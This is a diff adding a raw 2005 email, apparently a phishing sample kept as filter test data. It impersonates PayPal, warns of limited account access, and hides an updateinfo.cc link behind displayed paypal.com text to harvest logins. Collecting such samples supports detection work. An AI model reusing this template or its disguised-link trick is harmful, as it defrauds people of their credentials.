@@ -1,0 +1,66 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <service@paypal.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id 4AC3C536F1B
+ for <username@login.domain.com>; Thu, 31 Mar 2005 22:22:02 -0500 (EST)
+Received: from mail2.domain.com (mail2.domain.com [192.168.64.8])
+ by mail1.domain.com (Postfix) with ESMTP id 22E6785B373
+ for <username@domain.com>; Thu, 31 Mar 2005 22:22:02 -0500 (EST)
+Received: from administrator (unknown [62.139.42.106])
+ by mail2.domain.com (Postfix) with ESMTP id A6C2918369F
+ for <username@domain.com>; Thu, 31 Mar 2005 22:22:00 -0500 (EST)
+From: "service" <service@paypal.com>
+Subject: Please Restore Your Account Access
+To: username@domain.com
+Content-Type: text/html;iso-8859-1
+Reply-To: service@paypal.com
+Date: Fri, 1 Apr 2005 05:21:49 +0200
+X-Priority: 3
+X-Library: Indy 8.0.25
+Message-Id: <20050401032200.A6C2918369F@mail2.domain.com>
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 252
+
+<HTML>
+<A href="http://www.paypal.com/cgi-bin/webscr?cmd=_home">
+<IMG src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0 width="200" height="50"></A>  
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR>
+<TD colSpan=3><IMG height=2 src="pp.files/pixel.gif" width=2></TD></TR></TBODY></TABLE>
+<P><FONT size=2><FONT face=Verdana>Dear valued <STRONG><STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal<SUP>®</SUP></SPAN></STRONG> </STRONG>member</FONT>: <BR></FONT><BR></P>
+<FONT face=Verdana size=2>
+<P>As part of our security measures, we regularly screen activity in the<br>
+PayPal system. We recently contacted you after noticing an issue on your<br>
+account.We requested information from you for the following reason:<br>
+<br>
+A recent review of your account determined that we require some additional<br>
+information from you in order to provide you with secure service.<br>
+<br>
+Case ID Number: PP-000-000-000<br>
+This is a second reminder to log in to PayPal as soon as possible. Once you<br>
+log in, you will be provided with steps to restore your account access. <br>
+<br>
+In accordance with PayPal's User Agreement, your account access will remain<br>
+limited until the issue has been resolved. Unfortunately, if access to your<br>
+account remains limited for an extended period of time, it may result in<br>
+further limitations or eventual account closure. We encourage you to log in<br>
+to your PayPal account as soon as possible to help avoid this. <br>
+<br>
+To review your account and some or all of the information that PayPal used<br>
+to make its decision to limit your account access, please visit the<br>
+Resolution Center. If, after reviewing your account information, you seek<br>
+further clarification regarding your account access.<br>
+<br>
+We thank you for your prompt attention to this matter. Please understand<br>
+that this is a security measure intended to help protect you and your<br>
+account. We apologize for any inconvenience. </P>
+<P><FONT face=Verdana size=2>To update your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> records click on the following link: <BR></FONT><A href="http://updateinfo.cc/signinDQAAAG4AAADZ3XcFqGpyVexZXlp42ILckL16sz8USkBXj2StlL2lq74RZi-ZN0FOU7by8X_Jh2pn3AEECKZo8TFq0WyJ8IIGI0qgARKV_pf27Z0dSdpkBPWqiQQcY0sJJ8txaw-ifZToKQeM9OX1D4LVt4HygyKB.html" target=_self><FONT face=Verdana size=2>http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</FONT></A></P>
+<P><FONT face=Verdana size=2>Thank You.  <BR></FONT>Sincerely,<br>
+PayPal Account Review Department<br>
+&nbsp;</P>
+</FORM></FONT></BODY></HTML>
